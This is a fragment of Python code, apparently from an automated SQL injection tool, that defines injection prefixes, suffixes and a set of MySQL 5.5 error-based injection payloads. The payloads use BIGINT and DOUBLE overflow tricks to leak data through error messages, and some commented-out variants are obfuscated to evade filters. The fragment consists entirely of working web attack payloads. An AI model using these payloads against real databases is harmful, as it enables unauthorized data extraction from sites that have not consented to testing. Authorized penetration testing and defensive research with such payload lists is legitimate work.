...
Str1 = "0x"+Ste
TITLE = "MySQL = 5.5 error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (DOUBLE/BIGINT)"

## MySQL Injection Type AND MySQL Comments
PREFIXES, SUFIXES = (" ", "' ", ") ", "') "),("","AND 1", "AND'", "--+-", "%23", "AND '1")

# Test Queries for extractvalue()
TESTS = ("AND(SELECT(x+is+not+null)-9223372036854775808+FROM(SELECT(CONCAT(0x496e6a65637465647e,"+str(Str1)+",0x7e454e44))x)y)",
         "AND(SELECT(x*1E308)FROM(SELECT CONCAT(0x33, 0x496e6a65637465647e,"+str(Str1)+",0x7e454e44)x)y)",
         "AND(SELECT(IF(e,6,9)*1E308)FROM(SELECT(SELECT CONCAT(0x496e6a65637465647e,"+str(Str1)+",0x7e454e44))e)x)",
         "AND(EXP(~(SELECT*FROM(SELECT CONCAT(0x496e6a65637465647e,"+str(Str1)+",0x7e454e44)e)x)))",
         "AND(SELECT(!x-~0)FROM(SELECT CONCAT(0x496e6a65637465647e,"+str(Str1)+",0x7e454e44)x)y)",
         # "AND(/*!50000SELECT*/(IF(e,6,9)*1E308)/*!50000FROM*/(/*!50000SELECT*/(/*!50000SELECT*/ CONCAT/**_**/(0x496e6a65637465647e,"+str(Str1)+",0x7e454e44))e)x)",
         # "AND(/*!50000SELECT*/(!x-~0)/*!50000FROM*/(/*!50000SELECT*/ CONCAT/**_**/(0x496e6a65637465647e,"+str(Str1)+",0x7e454e44)x)y)",
         # "AND(/*!50000SELECT*/(x*1E308)/*!50000FROM*/(/*!50000SELECT*/ CONCAT/**_**/(0x33, 0x496e6a65637465647e,"+str(Str1)+",0x7e454e44)x)y)",
         # "AND(/*!50000SELECT*/(x+is+not+null)-9223372036854775808+/*!50000FROM*/(/*!50000SELECT*/(CONCAT/**_**/(0x496e6a65637465647e,"+str(Str1)+",0x7e454e44))x)y)"
         )
